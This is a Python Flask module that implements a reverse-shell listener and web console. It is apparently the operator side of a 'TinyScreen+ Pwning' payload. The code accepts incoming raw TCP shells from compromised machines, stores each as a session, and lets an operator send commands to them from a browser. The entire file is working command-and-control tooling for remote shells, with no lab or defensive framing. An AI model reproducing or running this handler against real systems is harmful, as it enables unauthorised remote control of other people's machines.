"""Raw-TCP reverse-shell listener with a terminal-style web console.

The TinyScreen+ Pwning payload calls back over a plain TCP socket, which Flask's
HTTP server cannot accept directly. This module runs a `socket` listener in a
background thread inside the Flask process, keeps every incoming shell in an
in-memory session, and exposes a Blueprint to read output and send commands from
the browser.

Sessions live in memory and stay visible after they close so the operator can
see which shells ended; use "Clear closed" to prune them. Each payload execution
opens a new connection and therefore a new shell.
"""
import logging
import socket
import threading
import time

from flask import Blueprint, abort, jsonify, render_template, request

logger = logging.getLogger(__name__)

reverse_shell_blueprint = Blueprint("reverse_shell", __name__)


@reverse_shell_blueprint.before_request
def require_local_operator():
    if request.remote_addr != "127.0.0.1":
        abort(403)


_sessions = {}
_next_id = 0
_lock = threading.Lock()


class _ShellSession:
    def __init__(self, session_id, conn, peer):
        self.session_id = session_id
        self.conn = conn
        self.peer = peer
        self.started_at = time.time()
        self.active = True
        self.closed_at = None
        self.name = ""
        self._transcript = bytearray()
        self._transcript_lock = threading.Lock()

    def append(self, chunk):
        with self._transcript_lock:
            self._transcript.extend(chunk)

    def text(self):
        with self._transcript_lock:
            return bytes(self._transcript).decode("utf-8", "replace")


def _drop(session):
    session.active = False
    session.closed_at = time.time()
    try:
        session.conn.close()
    except OSError:
        pass
    logger.info("Reverse shell #%s closed", session.session_id)


def _pump(session):
    conn = session.conn
    conn.settimeout(0.5)
    while True:
        try:
            chunk = conn.recv(4096)
        except socket.timeout:
            continue
        except OSError:
            break
        if not chunk:
            break
        session.append(chunk)
    _drop(session)


def _accept_loop(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(8)
    logger.info("Reverse-shell listener on %s:%s", host, port)
    global _next_id
    while True:
        conn, addr = server.accept()
        with _lock:
            _next_id += 1
            session = _ShellSession(_next_id, conn, f"{addr[0]}:{addr[1]}")
            _sessions[_next_id] = session
        logger.info("Reverse shell #%s from %s", session.session_id, session.peer)
        session.append(("[+] shell connected from " + session.peer + " - type a command and press Enter\n").encode("utf-8"))
        threading.Thread(target=_pump, args=(session,), daemon=True).start()


def start_reverse_shell_listener(host, port):
    threading.Thread(target=_accept_loop, args=(host, port), daemon=True).start()


def _session_or_404(session_id):
    with _lock:
        session = _sessions.get(session_id)
    if session is None:
        abort(404)
    return session


def _session_state(s):
    return {
        "id": s.session_id,
        "name": s.name,
        "peer": s.peer,
        "age": int(time.time() - s.started_at),
        "active": s.active,
        "closed_age": int(time.time() - s.closed_at) if s.closed_at else None,
        "text": s.text(),
    }


@reverse_shell_blueprint.get("/shell")
def shell_console():
    return render_template("reverse_shell.html")


@reverse_shell_blueprint.get("/shell/state")
def shell_state():
    with _lock:
        sessions = sorted(_sessions.values(), key=lambda s: s.session_id)
    return jsonify(sessions=[_session_state(s) for s in sessions])


@reverse_shell_blueprint.post("/shell/<int:session_id>/send")
def shell_send(session_id):
    session = _session_or_404(session_id)
    if not session.active:
        return jsonify(ok=False, error="This shell is closed."), 410
    command = (request.form.get("command") or "").strip()
    if command:
        try:
            session.conn.sendall(command.encode("utf-8", "replace") + b"\n")
        except OSError:
            _drop(session)
            return jsonify(ok=False, error="Connection lost."), 410
    return jsonify(ok=True)


@reverse_shell_blueprint.post("/shell/<int:session_id>/close")
def shell_close(session_id):
    session = _session_or_404(session_id)
    try:
        session.conn.sendall(b"exit\n")
    except OSError:
        pass
    _drop(session)
    return jsonify(ok=True)


@reverse_shell_blueprint.post("/shell/<int:session_id>/rename")
def shell_rename(session_id):
    session = _session_or_404(session_id)
    name = (request.form.get("name") or "").strip()[:32]
    with _lock:
        session.name = name
    return jsonify(ok=True)


@reverse_shell_blueprint.post("/shell/clear")
def shell_clear_closed():
    with _lock:
        for session_id in [sid for sid, s in _sessions.items() if not s.active]:
            del _sessions[session_id]
    return jsonify(ok=True)
